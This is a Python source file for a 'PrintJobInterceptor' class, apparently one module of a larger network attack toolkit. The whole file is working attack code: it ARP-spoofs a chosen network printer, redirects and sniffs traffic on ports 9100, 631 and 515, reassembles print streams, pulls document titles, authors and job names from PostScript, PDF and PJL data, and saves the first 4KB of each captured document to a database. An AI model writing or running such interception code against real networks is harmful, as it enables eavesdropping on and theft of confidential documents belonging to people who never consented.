"""
Print Job Interceptor
─────────────────────
Intercepts print jobs via MITM (ARP spoofing) to capture and analyze
documents being sent to network printers.

Features:
  - ARP spoof printer to redirect print traffic
  - Sniff traffic on port 9100 (RAW), 631 (IPP), 515 (LPD)
  - Identify and parse print jobs (PostScript, PCL, PDF)
  - Extract document content (file headers, metadata)
  - Store intercepted jobs in database
"""

import time
import threading

from scapy.all import (
    ARP, IP, TCP, Ether, Raw,
    sniff, sendp, srp, get_if_hwaddr, conf
)

from .config import IS_WINDOWS, IS_LINUX, log


# Print job magic bytes for format identification
PRINT_FORMAT_SIGNATURES = {
    "PDF": b"%PDF",
    "PostScript": b"%!PS",
    "PCL": b"\x1B%-12345X",
    "PCL_ESC": b"\x1B",
    "PJL": b"@PJL",
    "TIFF": b"II\x2A\x00",
    "TIFF_BE": b"MM\x00\x2A",
    "JPEG": b"\xFF\xD8\xFF",
    "PNG": b"\x89PNG",
}

# Printer-related ports
PRINTER_PORTS = [9100, 631, 515]


class PrintJobInterceptor:
    """
    Print job interception engine using ARP spoofing (MITM).
    Captures and analyzes documents sent to network printers.
    """

    def __init__(self, interface, printer_ip, db=None):
        self.interface = interface
        self.printer_ip = printer_ip
        self.db = db
        self.running = False
        self._thread = None
        self._arp_thread = None
        self._printer_mac = None
        self._attacker_mac = None
        self._intercepted_jobs = []
        self._active_streams = {}  # (src_ip, src_port) -> accumulated data
        self._lock = threading.Lock()
        self._job_counter = 0

    def start(self):
        """Start print job interception via ARP spoofing."""
        if IS_WINDOWS:
            log.warning("PrintJobInterceptor: ARP spoofing has limited Windows support")

        self.running = True

        # Get our MAC address
        try:
            self._attacker_mac = get_if_hwaddr(self.interface)
        except Exception as e:
            log.error(f"PrintJobInterceptor: Cannot get interface MAC: {e}")
            self.running = False
            return False

        # Resolve printer MAC
        self._printer_mac = self._resolve_mac(self.printer_ip)
        if not self._printer_mac:
            log.error(f"PrintJobInterceptor: Cannot resolve MAC for {self.printer_ip}")
            self.running = False
            return False

        log.info(f"PrintJobInterceptor: Target printer {self.printer_ip} ({self._printer_mac})")

        # Start ARP poisoning thread
        self._arp_thread = threading.Thread(target=self._arp_spoof_loop, daemon=True)
        self._arp_thread.start()

        # Start packet capture thread
        self._thread = threading.Thread(target=self._intercept_loop, daemon=True)
        self._thread.start()

        log.info("PrintJobInterceptor: Interception active")
        return True

    def stop(self):
        """Stop interception and restore ARP tables."""
        self.running = False

        # Restore ARP
        self._restore_arp()

        if self._arp_thread:
            self._arp_thread.join(timeout=5)
        if self._thread:
            self._thread.join(timeout=5)

        log.info(f"PrintJobInterceptor: Stopped. Captured {len(self._intercepted_jobs)} print jobs")

    def _resolve_mac(self, ip):
        """Resolve IP to MAC address via ARP."""
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=3, verbose=False, iface=self.interface
            )
            for _, r in ans:
                return r[ARP].hwsrc
        except Exception as e:
            log.error(f"PrintJobInterceptor: ARP resolution failed for {ip}: {e}")
        return None

    def _arp_spoof_loop(self):
        """Continuously ARP spoof to redirect printer traffic through us."""
        while self.running:
            try:
                # Tell clients that we are the printer
                sendp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2,
                        psrc=self.printer_ip,
                        hwsrc=self._attacker_mac,
                    ),
                    verbose=False, iface=self.interface
                )

                # Tell the printer that we are the gateway (for responses)
                sendp(
                    Ether(dst=self._printer_mac) / ARP(
                        op=2,
                        psrc="192.168.1.1",  # Assumed gateway
                        pdst=self.printer_ip,
                        hwsrc=self._attacker_mac,
                    ),
                    verbose=False, iface=self.interface
                )
            except Exception as e:
                log.error(f"PrintJobInterceptor: ARP spoof error: {e}")

            time.sleep(2)

    def _restore_arp(self):
        """Restore ARP tables after stopping."""
        if not self._printer_mac:
            return

        try:
            # Restore printer's real MAC in network ARP caches
            for _ in range(3):
                sendp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2,
                        psrc=self.printer_ip,
                        hwsrc=self._printer_mac,
                    ),
                    verbose=False, iface=self.interface
                )
                time.sleep(0.5)
        except Exception as e:
            log.error(f"PrintJobInterceptor: ARP restore error: {e}")

    def _intercept_loop(self):
        """Sniff print traffic on relevant ports."""
        bpf_filter = " or ".join(f"tcp port {p}" for p in PRINTER_PORTS)
        try:
            sniff(
                iface=self.interface,
                filter=bpf_filter,
                prn=self._parse_print_job,
                store=False,
                stop_filter=lambda x: not self.running,
            )
        except Exception as e:
            log.error(f"PrintJobInterceptor: Sniff error: {e}")

    def _parse_print_job(self, pkt):
        """Process captured packet for print job data."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
            return

        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]

        # Only interested in traffic going TO the printer
        dst_ip = ip_layer.dst
        if dst_ip != self.printer_ip:
            return

        dst_port = tcp_layer.dport
        if dst_port not in PRINTER_PORTS:
            return

        # Check for payload
        if not pkt.haslayer(Raw):
            # Check for connection teardown (FIN) - finalize stream
            if tcp_layer.flags & 0x01:  # FIN flag
                stream_key = (ip_layer.src, tcp_layer.sport)
                self._finalize_stream(stream_key)
            return

        payload = bytes(pkt[Raw].load)
        src_ip = ip_layer.src
        src_port = tcp_layer.sport
        stream_key = (src_ip, src_port)

        with self._lock:
            if stream_key not in self._active_streams:
                self._active_streams[stream_key] = {
                    "data": b"",
                    "src_ip": src_ip,
                    "dst_port": dst_port,
                    "start_time": time.time(),
                }

            self._active_streams[stream_key]["data"] += payload

            # If we have enough data, try to identify the format
            stream = self._active_streams[stream_key]
            if len(stream["data"]) > 65536:
                # Large job - finalize what we have
                self._finalize_stream(stream_key)

    def _finalize_stream(self, stream_key):
        """Finalize a captured print stream and extract document info."""
        with self._lock:
            if stream_key not in self._active_streams:
                return

            stream = self._active_streams.pop(stream_key)

        data = stream["data"]
        if len(data) < 4:
            return  # Too small to be a print job

        doc_info = self._extract_document(data)
        if not doc_info:
            return

        self._job_counter += 1
        job = {
            "job_id": self._job_counter,
            "printer_ip": self.printer_ip,
            "source_ip": stream["src_ip"],
            "timestamp": stream["start_time"],
            "document_type": doc_info["type"],
            "document_name": doc_info.get("name", "unknown"),
            "page_count": doc_info.get("pages"),
            "file_size": len(data),
            "metadata": doc_info.get("metadata", {}),
        }

        self._intercepted_jobs.append(job)
        log.info(
            f"PrintJobInterceptor: Captured {doc_info['type']} job from "
            f"{stream['src_ip']} ({len(data)} bytes)"
        )

        # Store in database
        if self.db:
            try:
                self.db.log_print_job(
                    printer_ip=self.printer_ip,
                    source_ip=stream["src_ip"],
                    doc_name=doc_info.get("name", "unknown"),
                    doc_type=doc_info["type"],
                    page_count=doc_info.get("pages"),
                    file_size=len(data),
                    content=data[:4096],  # Store first 4KB for analysis
                )
            except Exception as e:
                log.error(f"PrintJobInterceptor: DB error: {e}")

    def _extract_document(self, data):
        """Extract document type and metadata from raw print data."""
        doc_type = "Unknown"
        doc_name = None
        pages = None
        metadata = {}

        # Identify format from magic bytes
        for fmt, signature in PRINT_FORMAT_SIGNATURES.items():
            if data[:len(signature)] == signature:
                doc_type = fmt
                break

        # Extract metadata based on format
        if doc_type == "PostScript":
            metadata = self._parse_postscript_metadata(data)
            doc_name = metadata.get("Title")
            pages_str = metadata.get("Pages")
            if pages_str:
                try:
                    pages = int(pages_str)
                except (ValueError, TypeError):
                    pass

        elif doc_type == "PDF":
            metadata = self._parse_pdf_metadata(data)
            doc_name = metadata.get("Title")

        elif doc_type in ("PJL", "PCL"):
            metadata = self._parse_pjl_metadata(data)
            doc_name = metadata.get("JOB NAME")

        if not doc_name:
            doc_name = f"document_{self._job_counter}.{doc_type.lower()}"

        return {
            "type": doc_type,
            "name": doc_name,
            "pages": pages,
            "metadata": metadata,
        }

    def _parse_postscript_metadata(self, data):
        """Parse PostScript DSC comments for metadata."""
        metadata = {}
        try:
            # Only look at first 4KB for DSC comments
            header = data[:4096].decode("utf-8", errors="ignore")
            for line in header.split("\n"):
                if line.startswith("%%Title:"):
                    metadata["Title"] = line[8:].strip().strip("()")
                elif line.startswith("%%Creator:"):
                    metadata["Creator"] = line[10:].strip()
                elif line.startswith("%%Pages:"):
                    val = line[8:].strip()
                    if val != "(atend)":
                        metadata["Pages"] = val
                elif line.startswith("%%CreationDate:"):
                    metadata["CreationDate"] = line[15:].strip()
                elif line.startswith("%%For:"):
                    metadata["Author"] = line[6:].strip()
        except Exception:
            pass
        return metadata

    def _parse_pdf_metadata(self, data):
        """Parse PDF metadata from document info dictionary."""
        metadata = {}
        try:
            # Look for /Title, /Author, /Creator in PDF
            text = data[:8192].decode("latin-1", errors="ignore")
            for key in ("Title", "Author", "Creator", "Producer", "Subject"):
                marker = f"/{key}"
                idx = text.find(marker)
                if idx > 0:
                    # Extract value between parentheses or after space
                    rest = text[idx + len(marker):idx + len(marker) + 200]
                    paren_start = rest.find("(")
                    paren_end = rest.find(")")
                    if 0 <= paren_start < paren_end:
                        metadata[key] = rest[paren_start + 1:paren_end]
        except Exception:
            pass
        return metadata

    def _parse_pjl_metadata(self, data):
        """Parse PJL commands for job information."""
        metadata = {}
        try:
            header = data[:2048].decode("utf-8", errors="ignore")
            for line in header.split("\r\n"):
                line = line.strip()
                if line.startswith("@PJL JOB NAME"):
                    # @PJL JOB NAME = "document.pdf"
                    eq_pos = line.find("=")
                    if eq_pos > 0:
                        val = line[eq_pos + 1:].strip().strip('"')
                        metadata["JOB NAME"] = val
                elif line.startswith("@PJL SET"):
                    parts = line[8:].strip().split("=", 1)
                    if len(parts) == 2:
                        metadata[parts[0].strip()] = parts[1].strip()
        except Exception:
            pass
        return metadata

    def get_intercepted_jobs(self):
        """Return list of intercepted print jobs."""
        return list(self._intercepted_jobs)

    def get_stats(self):
        """Return interceptor statistics."""
        with self._lock:
            active = len(self._active_streams)

        type_counts = {}
        for job in self._intercepted_jobs:
            t = job.get("document_type", "Unknown")
            type_counts[t] = type_counts.get(t, 0) + 1

        return {
            "printer_ip": self.printer_ip,
            "jobs_intercepted": len(self._intercepted_jobs),
            "active_streams": active,
            "document_types": type_counts,
            "total_bytes": sum(j.get("file_size", 0) for j in self._intercepted_jobs),
            "running": self.running,
        }
